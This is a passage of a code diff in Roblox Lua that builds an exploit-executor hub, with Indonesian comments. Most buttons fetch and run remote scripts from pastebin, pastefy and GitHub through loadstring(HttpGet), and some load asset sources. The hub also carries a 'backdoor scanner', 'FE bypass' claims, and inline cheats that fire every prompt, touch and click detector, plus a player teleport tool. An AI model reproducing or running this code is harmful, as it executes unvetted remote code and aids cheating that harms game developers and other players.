+Topk3k.Text = "HD-ADMIN.TXT"
+Topk3k.TextColor3 = Color3.fromRGB(0, 0, 0)
+Topk3k.TextSize = 20.000
+Topk3k.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PHGS971/HDadmin/refs/heads/main/HDadmin.lua'))()
+end)
+
+Duck.Name = "Duck"
+Duck.Parent = scriptlist
+Duck.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Duck.Position = UDim2.new(0, 0, 0.0, 163)
+Duck.Size = UDim2.new(0, 132, 0, 23)
+Duck.Font = Enum.Font.SourceSans
+Duck.Text = "MISTIC.TXT"
+Duck.TextColor3 = Color3.fromRGB(0, 0, 0)
+Duck.TextSize = 20.000
+Duck.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/AaDfrnFK"))()
+end)
+
+Disco.Name = "Disco"
+Disco.Parent = scriptlist
+Disco.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Disco.Position = UDim2.new(0, 0, 0.0, 187)
+Disco.Size = UDim2.new(0, 132, 0, 23)
+Disco.Font = Enum.Font.SourceSans
+Disco.Text = "DOGGYARMY.TXT"
+Disco.TextColor3 = Color3.fromRGB(0, 0, 0)
+Disco.TextSize = 20.000
+Disco.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/ChM2b8Oh/raw"))()
+end)
+
+Polaria.Name = "Polaria"
+Polaria.Parent = scriptlist
+Polaria.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Polaria.Position = UDim2.new(0, 0, 0.0, 211)
+Polaria.Size = UDim2.new(0, 132, 0, 23)
+Polaria.Font = Enum.Font.SourceSans
+Polaria.Text = "POLARIA.TXT"
+Polaria.TextColor3 = Color3.fromRGB(0, 0, 0)
+Polaria.TextSize = 20.000
+Polaria.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/xos3Of2N/raw"))()
+end)
+
+BiPolaria.Name = "BiPolaria"
+BiPolaria.Parent = scriptlist
+BiPolaria.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+BiPolaria.Position = UDim2.new(0, 0, 0.0, 235)
+BiPolaria.Size = UDim2.new(0, 132, 0, 23)
+BiPolaria.Font = Enum.Font.SourceSans
+BiPolaria.Text = "BIPOLARIA.TXT"
+BiPolaria.TextColor3 = Color3.fromRGB(0, 0, 0)
+BiPolaria.TextSize = 20.000
+BiPolaria.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/8qFWEtWY"))()
+end)
+
+Scythe.Name = "Scythe"
+Scythe.Parent = scriptlist
+Scythe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scythe.Position = UDim2.new(0, 0, 0.0, 258)
+Scythe.Size = UDim2.new(0, 132, 0, 23)
+Scythe.Font = Enum.Font.SourceSans
+Scythe.Text = "ADMIN.TXT"
+Scythe.TextColor3 = Color3.fromRGB(0, 0, 0)
+Scythe.TextSize = 20.000
+Scythe.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/ciJVZnxH/raw"))()
+end)
+
+Freddy.Name = "Freddy"
+Freddy.Parent = scriptlist
+Freddy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Freddy.Position = UDim2.new(0, 0, 0.0, 282)
+Freddy.Size = UDim2.new(0, 132, 0, 23)
+Freddy.Font = Enum.Font.SourceSans
+Freddy.Text = "EXSER.TXT"
+Freddy.TextColor3 = Color3.fromRGB(0, 0, 0)
+Freddy.TextSize = 20.000
+Freddy.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/7sO8ckTL/raw",true))()
+end)
+
+Soul.Name = "Soul"
+Soul.Parent = scriptlist
+Soul.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Soul.Position = UDim2.new(0, 0, 0.0, 306)
+Soul.Size = UDim2.new(0, 132, 0, 23)
+Soul.Font = Enum.Font.SourceSans
+Soul.Text = "KEYBOARD.TXT"
+Soul.TextColor3 = Color3.fromRGB(0, 0, 0)
+Soul.TextSize = 20.000
+Soul.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
+end)
+
+Goner.Name = "Goner"
+Goner.Parent = scriptlist
+Goner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Goner.Position = UDim2.new(0, 0, 0.0, 330)
+Goner.Size = UDim2.new(0, 132, 0, 23)
+Goner.Font = Enum.Font.SourceSans
+Goner.Text = "MJOLNIR.TXT"
+Goner.TextColor3 = Color3.fromRGB(0, 0, 0)
+Goner.TextSize = 20.000
+Goner.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/JWZk5sQi/raw"))()
+end)
+
+Mr.Name = "Mr"
+Mr.Parent = scriptlist
+Mr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Mr.Position = UDim2.new(0, 0, 0.0, 353)
+Mr.Size = UDim2.new(0, 132, 0, 23)
+Mr.Font = Enum.Font.SourceSans
+Mr.Text = "BLUUDUUD.TXT"
+Mr.TextColor3 = Color3.fromRGB(0, 0, 0)
+Mr.TextSize = 20.000
+Mr.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/CcHxT0Gj"))()
+end)
+
+pex.Name = "pex"
+pex.Parent = scriptlist
+pex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+pex.Position = UDim2.new(0, 0, 0.0, 374)
+pex.Size = UDim2.new(0, 132, 0, 23)
+pex.Font = Enum.Font.SourceSans
+pex.Text = "NEKO.TXT"
+pex.TextColor3 = Color3.fromRGB(0, 0, 0)
+pex.TextSize = 20.000
+pex.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/neko"))()
+end)
+
+
+
+HeadName.Name = "HeadName"
+HeadName.Parent = scriptlist
+HeadName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HeadName.Position = UDim2.new(0, 0, 0.0, 398)
+HeadName.Size = UDim2.new(0, 132, 0, 23)
+HeadName.Font = Enum.Font.SourceSans
+HeadName.Text = "FENRIER-PAINSIS.TXT"
+HeadName.TextColor3 = Color3.fromRGB(0, 0, 0)
+HeadName.TextSize = 20.000
+HeadName.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/az0yaa2e/raw"))()
+end)
+
+Decal.Name = "Decal"
+Decal.Parent = scriptlist
+Decal.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Decal.Position = UDim2.new(0, 0, 0.0, 422)
+Decal.Size = UDim2.new(0, 132, 0, 23)
+Decal.Font = Enum.Font.SourceSans
+Decal.Text = "DEVOYANCE.txt"
+Decal.TextColor3 = Color3.fromRGB(0, 0, 0)
+Decal.TextSize = 20.000
+Decal.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Devoyance"))()
+end)
+
+kick.Name = "kick"
+kick.Parent = scriptlist
+kick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+kick.Position = UDim2.new(0, 0, 0.0, 446)
+kick.Size = UDim2.new(0, 132, 0, 23)
+kick.Font = Enum.Font.SourceSans
+kick.Text = "RO-EXPLOIT V4.TXT"
+kick.TextColor3 = Color3.fromRGB(0, 0, 0)
+kick.TextSize = 20.000
+kick.MouseButton1Click:Connect(function()
+loadstring(game:GetObjects("rbxassetid://175137115")[1].Source)()
+end)
+
+virus.Name = "virus"
+virus.Parent = scriptlist
+virus.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+virus.Position = UDim2.new(0, 0, 0.0, 469)
+virus.Size = UDim2.new(0, 132, 0, 23)
+virus.Font = Enum.Font.SourceSans
+virus.Text = "RO-EXPLOIT-V5.TXT"
+virus.TextColor3 = Color3.fromRGB(0, 0, 0)
+virus.TextSize = 20.000
+virus.MouseButton1Click:Connect(function()
+loadstring(game:GetObjects("rbxassetid://288646117")[1].Source)()
+end)
+
+Admin.Name = "Admin"
+Admin.Parent = scriptlist
+Admin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Admin.Position = UDim2.new(0, 0, 0.0, 493)
+Admin.Size = UDim2.new(0, 132, 0, 23)
+Admin.Font = Enum.Font.SourceSans
+Admin.Text = "RO-EXPLOIT V6.TXT"
+Admin.TextColor3 = Color3.fromRGB(0, 0, 0)
+Admin.TextSize = 20.000
+Admin.MouseButton1Click:Connect(function()
+end)
+
+Car.Name = "Car"
+Car.Parent = scriptlist
+Car.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Car.Position = UDim2.new(0, 0, 0.0, 517)
+Car.Size = UDim2.new(0, 132, 0, 23)
+Car.Font = Enum.Font.SourceSans
+Car.Text = "RO-EXPLOIT V7.TXT"
+Car.TextColor3 = Color3.fromRGB(0, 0, 0)
+Car.TextSize = 20.000
+Car.MouseButton1Click:Connect(function()
+loadstring(game:GetObjects('rbxassetid://337743103')[1].Source)()
+end)
+
+ssp.Name = "ssp"
+ssp.Parent = scriptlist
+ssp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ssp.Position = UDim2.new(0, 0, 0.0, 541)
+ssp.Size = UDim2.new(0, 132, 0, 23)
+ssp.Font = Enum.Font.SourceSans
+ssp.Text = "SLEDGE HAMMER.TXT"
+ssp.TextColor3 = Color3.fromRGB(0, 0, 0)
+ssp.TextSize = 18.000
+ssp.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/jmJgSbvV/raw?part=Sledgehammer", true))()
+end)
+
+disco.Name = "disco"
+disco.Parent = scriptlist
+disco.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+disco.Position = UDim2.new(0, 0, 0.0, 565)
+disco.Size = UDim2.new(0, 132, 0, 23)
+disco.Font = Enum.Font.SourceSans
+disco.Text = "SEASOLA.TXT"
+disco.TextColor3 = Color3.fromRGB(0, 0, 0)
+disco.TextSize = 20.000
+disco.MouseButton1Click:Connect(function()
+game:GetObjects("rbxassetid://78030789294372")[1].Parent = game.workspace
+end)
+
+Dec.Name = "Dec"
+Dec.Parent = scriptlist
+Dec.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Dec.Position = UDim2.new(0, 0, 0.0, 589)
+Dec.Size = UDim2.new(0, 132, 0, 23)
+Dec.Font = Enum.Font.SourceSans
+Dec.Text = "ALLAH MAP.TXT"
+Dec.TextColor3 = Color3.fromRGB(0, 0, 0)
+Dec.TextSize = 20.000
+Dec.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/NNp1NJKT"))()
+end)
+
+jum.Name = "jum"
+jum.Parent = scriptlist
+jum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+jum.Position = UDim2.new(0, 0, 0.0, 613)
+jum.Size = UDim2.new(0, 132, 0, 23)
+jum.Font = Enum.Font.SourceSans
+jum.Text = "C4 BOMBA.TXT"
+jum.TextColor3 = Color3.fromRGB(0, 0, 0)
+jum.TextSize = 20.000
+jum.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/M0r9UCNQ/raw",true))()
+end)
+
+DIS.Name = "DIS"
+DIS.Parent = scriptlist
+DIS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DIS.Position = UDim2.new(0, 0, 0.0, 637)
+DIS.Size = UDim2.new(0, 132, 0, 23)
+DIS.Font = Enum.Font.SourceSans
+DIS.Text = "DISCO.TXT"
+DIS.TextColor3 = Color3.fromRGB(0, 0, 0)
+DIS.TextSize = 20.000
+DIS.MouseButton1Click:Connect(function()
+local Lighting = game:GetService("Lighting")
+local ColorCorrection = Instance.new("ColorCorrectionEffect")
+ColorCorrection.Parent = Lighting
+
+local function zigzag(X)
+	return math.acos(math.cos(X * math.pi)) / math.pi
+end
+
+local Counter = 0
+Lighting.TimeOfDay = "12:00"
+
+while task.wait(0.1) do
+	local color = Color3.fromHSV(zigzag(Counter), 1, 1)
+	ColorCorrection.TintColor = color
+	Lighting.Ambient = color
+	Counter += 0.01
+end
+end)
+
+Deca.Name = "Deca"
+Deca.Parent = scriptlist
+Deca.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Deca.Position = UDim2.new(0, 0, 0.0, 661)
+Deca.Size = UDim2.new(0, 132, 0, 23)
+Deca.Font = Enum.Font.SourceSans
+Deca.Text = "STEVE.TXT"
+Deca.TextColor3 = Color3.fromRGB(0, 0, 0)
+Deca.TextSize = 20.000
+Deca.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Steve-script-24707"))()
+end)
+
+ju.Name = "ju"
+ju.Parent = scriptlist
+ju.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ju.Position = UDim2.new(0, 0, 0.0, 685)
+ju.Size = UDim2.new(0, 132, 0, 23)
+ju.Font = Enum.Font.SourceSans
+ju.Text = "GRABGUN.TXT"
+ju.TextColor3 = Color3.fromRGB(0, 0, 0)
+ju.TextSize = 20.000
+ju.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/grab"))()
+end)
+
+shel.Name = "shel"
+shel.Parent = scriptlist
+shel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+shel.Position = UDim2.new(0, 0, 0.0, 708)
+shel.Size = UDim2.new(0, 132, 0, 23)
+shel.Font = Enum.Font.SourceSans
+shel.Text = "ALL SEEING HAND.TXT"
+shel.TextColor3 = Color3.fromRGB(0, 0, 0)
+shel.TextSize = 19.000
+shel.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Flowey"))()
+end)
+
+logo.Name = "logo"
+logo.Parent = Frame
+logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+logo.Position = UDim2.new(0.25, 0, 0.685039341, 0)
+logo.Size = UDim2.new(0, 137, 0, 27)
+logo.Font = Enum.Font.SourceSans
+logo.Text = "Load"
+logo.TextColor3 = Color3.fromRGB(0, 0, 0)
+logo.TextSize = 30.000
+logo.MouseButton1Click:Connect(function()
+game.ReplicatedStorage.RemoteEvent:FireServer(script.Parent.Parent.TextBox.Text)
+end)
+
+outputContainer.Parent = Frame
+outputContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+outputContainer.Position = UDim2.new(0.5, 0, 0.669291317, 3)
+outputContainer.Size = UDim2.new(0, 163, 0, 116)
+outputContainer.ScrollBarThickness = 13
+outputContainer.CanvasSize = UDim2.new(0, 0, 0, 200)
+outputContainer.VerticalScrollBarInset = Enum.ScrollBarInset.Always
+
+output.Parent = outputContainer
+output.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+output.Size = UDim2.new(1, 0, 1, 0)
+output.Font = Enum.Font.SourceSans
+output.Text = "Project broken spawn was created by brokenspawn10200 and team.fanb0yhaxxteamers. A script similar to Fe bypass Fake or serverside Load"
+output.TextColor3 = Color3.fromRGB(0, 0, 0)
+output.TextSize = 14.000
+output.TextWrapped = true
+output.TextXAlignment = Enum.TextXAlignment.Left
+output.TextYAlignment = Enum.TextYAlignment.Top
+
+lua.Name = "lua"
+lua.Parent = Frame
+lua.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+lua.BorderSizePixel = 0
+lua.Position = UDim2.new(0.140350878, 0, 0.076115489, 0)
+lua.Size = UDim2.new(0, 920, 0, 0)
+lua.Font = Enum.Font.SourceSans
+lua.Text = "(Lua) credit 00de0l"
+lua.TextColor3 = Color3.fromRGB(0, 0, 0)
+lua.TextSize = 20.000
+lua.MouseButton1Click:Connect(function()
+end)
+
+hint.Name = "hint"
+hint.Parent = scriptlist
+hint.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+hint.Position = UDim2.new(0, 0, 0.0, 732)
+hint.Size = UDim2.new(0, 132, 0, 23)
+hint.Font = Enum.Font.SourceSans
+hint.Text = "PATRICK.TXT"
+hint.TextColor3 = Color3.fromRGB(0, 0, 0)
+hint.TextSize = 20.000
+hint.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Patrick"))()
+end)
+
+ex.Name = "ex"
+ex.Parent = Frame
+ex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ex.Position = UDim2.new(0.0159489624, 0, 0.685039341, 80)
+ex.Size = UDim2.new(0, 137, 0, 27)
+ex.Font = Enum.Font.SourceSans
+ex.Text = "Execute require"
+ex.TextColor3 = Color3.fromRGB(0, 0, 0)
+ex.TextSize = 25.000
+ex.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/grab"))()
+end)
+end)
+
+addRightButton("  DICK ", Color3.fromRGB(200, 200, 255), function()
+loadstring(game:HttpGet("https://pastefy.app/jGyWZQue/raw"))()
+end)
+
+addRightButton("  backdoor scanner ", Color3.fromRGB(200, 200, 255), function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Backdoor-scanner-58235"))()
+end)
+
+addRightButton("  Proximypromt All", Color3.fromRGB(200, 200, 255), function()
+-- Jalankan lewat executor
+for _, obj in pairs(workspace:GetDescendants()) do
+    if obj:IsA("ProximityPrompt") then
+        pcall(function()
+            -- fungsi exploit umum: fireproximityprompt
+            fireproximityprompt(obj)
+        end)
+    end
+end
+end)
+
+addRightButton("  touchinterst all", Color3.fromRGB(200, 200, 255), function()
+-- Jalankan di executor (contoh untuk player lokal)
+local player = game:GetService("Players").LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local hrp = char:FindFirstChild("HumanoidRootPart")
+if not hrp then return end
+
+for _, part in pairs(workspace:GetDescendants()) do
+    if part:IsA("BasePart") and part ~= hrp then
+        pcall(function()
+            -- 0 = touch began, 1 = touch ended (beberapa exploit/impl berbeda)
+            firetouchinterest(hrp, part, 0)
+            firetouchinterest(hrp, part, 1)
+        end)
+    end
+end
+end)
+
+addRightButton("  click detector all", Color3.fromRGB(200, 200, 255), function()
+for _, cd in pairs(workspace:GetDescendants()) do
+    if cd:IsA("ClickDetector") then
+        pcall(function()
+            fireclickdetector(cd)
+        end)
+    end
+end
+end)
+
+addRightButton(" esp tool for(mm2 or what) ", Color3.fromRGB(200, 200, 255), function()
+
+end)
+
+
+-- DELETE
+
+
+addRightButton(" r6 ", Color3.fromRGB(200, 200, 255), function()
+    
+
+end)
+
+addRightButton(" dex) ", Color3.fromRGB(200, 200, 255), function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Dex-Explorer-plus-50432"))()
+end) 
+-- Button: Fake Admin Powers
+
+
+--// LocalScript GUI rtrt / View Player
+
+
+-- GUI Utama
+
+
+
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0, 12)
+
+local Frame = Instance.new("Frame", Frameeeee2)
+Frame.Name = 'ViewwerDigga'
+Frame.Size = UDim2.new(0, 260, 0, 320)
+Frame.Position = UDim2.new(0, -308, 0, 50)
+Frame.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+Frame.BorderSizePixel = 0
+
+-- Judul Mode
+local Title = Instance.new("TextLabel", Frame)
+Title.Text = "Mode: Teleport Player"
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 14
+
+-- Tombol Toggle Mode
+local ToggleButton = Instance.new("TextButton", Frame)
+ToggleButton.Text = "🔁 Ganti Mode"
+ToggleButton.Size = UDim2.new(1, -20, 0, 25)
+ToggleButton.Position = UDim2.new(0, 10, 0, 35)
+ToggleButton.BackgroundColor3 = Color3.fromRGB(220, 40, 40)
+ToggleButton.TextColor3 = Color3.new(1, 1, 1)
+ToggleButton.Font = Enum.Font.Gotham
+ToggleButton.TextSize = 13
+local UICorner2 = Instance.new("UICorner", ToggleButton)
+UICorner2.CornerRadius = UDim.new(0, 6)
+
+-- Tombol Reset Kamera
+local ResetCam = Instance.new("TextButton", Frame)
+ResetCam.Text = "🎥 Reset Kamera"
+ResetCam.Size = UDim2.new(1, -20, 0, 25)
+ResetCam.Position = UDim2.new(0, 10, 0, 65)
+ResetCam.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+ResetCam.TextColor3 = Color3.new(1, 1, 1)
+ResetCam.Font = Enum.Font.Gotham
+ResetCam.TextSize = 13
+local UICorner3 = Instance.new("UICorner", ResetCam)
+UICorner3.CornerRadius = UDim.new(0, 6)
+
+-- Tombol Close GUI
+local CloseButton = Instance.new("TextButton", Frame)
+CloseButton.Text = "❌"
+CloseButton.Size = UDim2.new(0, 25, 0, 25)
+CloseButton.Position = UDim2.new(1, -30, 0, 5)
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+CloseButton.TextColor3 = Color3.new(1, 1, 1)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 14
+local UICornerClose = Instance.new("UICorner", CloseButton)
+UICornerClose.CornerRadius = UDim.new(1, 0)
+
+-- Scrolling daftar player
+local ScrollingFrame = Instance.new("ScrollingFrame", Frame)
+ScrollingFrame.Size = UDim2.new(1, -20, 1, -110)
+ScrollingFrame.Position = UDim2.new(0, 10, 0, 95)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+ScrollingFrame.ScrollBarThickness = 6
+ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1
+ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y -- 🔥 auto height saat nambah player
+ScrollingFrame.ClipsDescendants = true
+
+local UIListLayout = Instance.new("UIListLayout", ScrollingFrame)
+UIListLayout.Padding = UDim.new(0, 4)
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+-- Variabel Mode
+local mode = "Teleport" -- Teleport / View
+
+-- Fungsi update daftar player
+local function updatePlayers()
+	for _, child in ipairs(ScrollingFrame:GetChildren()) do
+		if child:IsA("TextButton") then
+			child:Destroy()
+		end
+	end
+
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr ~= LocalPlayer then
+			local btn = Instance.new("TextButton", ScrollingFrame)
+			btn.Size = UDim2.new(1, 0, 0, 30)
+			btn.Text = plr.DisplayName
+			btn.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+			btn.TextColor3 = Color3.new(1, 1, 1)
+			btn.Font = Enum.Font.Gotham
+			btn.TextSize = 14
+
+			local corner = Instance.new("UICorner", btn)
+			corner.CornerRadius = UDim.new(0, 6)
+
+			btn.MouseButton1Click:Connect(function()
+				local char = plr.Character
+				local hrp = char and char:FindFirstChild("HumanoidRootPart")
+				local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+				local myHRP = myChar:WaitForChild("HumanoidRootPart")
+
+				if mode == "Teleport" then
+					if hrp and myHRP then
+						myHRP.CFrame = hrp.CFrame * CFrame.new(0, 0, 3)
+					end
+				elseif mode == "View" then
+					if char then
+						camera.CameraSubject = char:FindFirstChildOfClass("Humanoid")
+						camera.CameraType = Enum.CameraType.Custom
+					end
+				end
+			end)
+		end
+	end
+end
+
+-- Toggle Mode
+ToggleButton.MouseButton1Click:Connect(function()
+	if mode == "Teleport" then
+		mode = "View"
+		Title.Text = "Mode: View Player"
+		ToggleButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+	else
+		mode = "Teleport"
+		Title.Text = "Mode: Teleport Player"
+		ToggleButton.BackgroundColor3 = Color3.fromRGB(220, 40, 40)
+	end
+end)
+
+-- Reset Kamera ke Player Sendiri
+ResetCam.MouseButton1Click:Connect(function()
+	camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+	camera.CameraType = Enum.CameraType.Custom
+end)
+
+-- Close GUI
+CloseButton.MouseButton1Click:Connect(function()
+	ScreenGui:Destroy()
+end)
+
+-- Update otomatis kalau player join / keluar
+updatePlayers()
+Players.PlayerAdded:Connect(updatePlayers)
+Players.PlayerRemoving:Connect(updatePlayers)
+
+-- Close GUI
+CloseButton.MouseButton1Click:Connect(function()
+
+end)
+
+-- Update List Player Otomatis
+updatePlayers()
+Players.PlayerAdded:Connect(updatePlayers)
+Players.PlayerRemoving:Connect(updatePlayers)
+
+-- 🌙 Dual Rotating Circle Logo + Avatar (kecil & bulat)
+
+-- frame utama
+local frame = Instance.new("Frame", Frameeeee2)
+frame.Name = 'CircleLOGGK'
+frame.Size = UDim2.new(0, 150, 0, 150)
+frame.Position = UDim2.new(0, 0, 0, -85)
+frame.AnchorPoint = Vector2.new(0, 0)
+frame.BackgroundTransparency = 1
+
+-- clip agar bulat
+local corner = Instance.new("UICorner", frame)
+corner.CornerRadius = UDim.new(1, 0)
+
+-- logo luar (muter kanan)
+local avaqtar = Instance.new("ImageLabel", frame)
+avaqtar.Size = UDim2.new(0.75, 0, 0.75, 0)
+avaqtar.Position = UDim2.new(0, 658, 0, 30)
+avaqtar.AnchorPoint = Vector2.new(0.5, 0.5)
+avaqtar.BackgroundTransparency = 1
+avaqtar.Image = "rbxassetid://77005694743685"
+
+local logoCorner = Instance.new("UICorner", avaqtar)
+logoCorner.CornerRadius = UDim.new(1, 0)
+
+-- avatar player (muter kiri)
+local avatar = Instance.new("ImageLabel", frame)
+avatar.Size = UDim2.new(0.75, 0, 0.75, 0)
+avatar.Position = UDim2.new(0, 858, 0, 30)
+avatar.AnchorPoint = Vector2.new(0.5, 0.5)
+avatar.BackgroundTransparency = 1
+avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
+
+local avatarCorner = Instance.new("UICorner", avatar)
+avatarCorner.CornerRadius = UDim.new(1, 0)
+
+-- ring tipis mengelilingi
+local ring = Instance.new("UIStroke", avaqtar)
+ring.Thickness = 2
+ring.Color = Color3.fromRGB(255, 255, 255)
+ring.Transparency = 0.2
+
+local ring = Instance.new("UIStroke", avatar)
+ring.Thickness = 2
+ring.Color = Color3.fromRGB(255, 255, 255)
+ring.Transparency = 0.2
+
+-- animasi rotasi berlawanan arah
+local rotation1, rotation2 = 0, 0
+RunService.RenderStepped:Connect(function(dt)
+	rotation1 = (rotation1 + 40 * dt) % 360  -- logo kanan
+	rotation2 = (rotation2 - 0 * dt) % 360  -- avatar kiri
+	avaqtar.Rotation = rotation1
+	avatar.Rotation = rotation2
+end)
+
+--// GUI Gerak X, Y, Z dengan Tween & Tombol + - per arah
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+player.CharacterAdded:Connect(function(newChar)
+	character = newChar
+	hrp = newChar:WaitForChild("HumanoidRootPart")
+end)
+
+-- LocalScript (StarterPlayerScripts)
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Buat ScreenGui
+
+
+
+local MnPrt = Instance.new("Frame")
+local InPrt = Instance.new("Frame")
+local Cody = Instance.new("TextBox")
+local Execy = Instance.new("TextButton")
+local Acqur = Instance.new("TextButton")
+local CLR = Instance.new("TextButton")
+local r6 = Instance.new("TextButton")
+local re = Instance.new("TextButton")
+local g = Instance.new("TextButton")
+local Labely = Instance.new("TextLabel")
+
+MnPrt.Active = true
+MnPrt.BackgroundColor3 = Color3.new(0,0,0)
+MnPrt.BorderColor3 = Color3.new(1,0,0)
+MnPrt.Name = "MainPartByGavindR"
+MnPrt.Parent = Frameeeee2
+MnPrt.Position = UDim2.new(0.5, 566, 0.5, -175)
+MnPrt.Size = UDim2.new(0,360,0,240)
+MnPrt.Draggable = true
+
+local corner = Instance.new("UICorner", MnPrt)
+corner.CornerRadius = UDim.new(0, 12)
+
+-- Rainbow effect
+task.spawn(function()
+	while task.wait() do
+		local t = tick() * 1
+		MnPrt.BackgroundColor3 = Color3.fromHSV((t % 5) / 5, 1, 1)
+	end
+end)
+
+InPrt.Active = true
+InPrt.BackgroundColor3 = Color3.new(0,0,0)
+InPrt.BorderColor3 = Color3.new(1,0,0)
+InPrt.Name = "Inside"
+InPrt.Parent = MnPrt
+InPrt.Position = UDim2.new(0,0,0,50)
+InPrt.Size = UDim2.new(0,360,0,280)
+InPrt.Draggable = false
+
+local shsj = [[
+for i,v in pairs(game:GetService('Players'):GetPlayers()) do 
+  if v.Character ~= nil and v.Character:IsA("Model") and v.Character:FindFirstChildWhichIsA("Humanoid") then 
+    v.Character:FindFirstChildWhichIsA("Humanoid").Jump = true 
+  end
+end
+]]
+
+Cody.Active = true
+Cody.BackgroundColor3 = Color3.new(0,0,0)
+Cody.BorderColor3 = Color3.new(1,0,0)
+Cody.ClearTextOnFocus = false
+Cody.TextScaled = false
+Cody.MultiLine = true
+Cody.Name = "Code"
+Cody.Parent = InPrt
+Cody.Position = UDim2.new(0,5,0,5)
+Cody.Size = UDim2.new(0,350,0,140)
+Cody.Font = Enum.Font.Legacy
+Cody.Text = shsj
+Cody.TextSize = 20
+Cody.TextColor3 = Color3.new(1,0,0)
+-- bust gk bisa 
+Cody.TextXAlignment = Enum.TextXAlignment.Left
+Cody.TextYAlignment = Enum.TextYAlignment.Top
+-- Variabel ukuran teks
+local normalScale = 1
+local focusScale = 1.5
+
+-- Event ketika TextBox mulai fokus (diklik)
+Cody.Focused:Connect(function()
+	Cody.TextScaled = false -- supaya bisa ubah ukuran manual
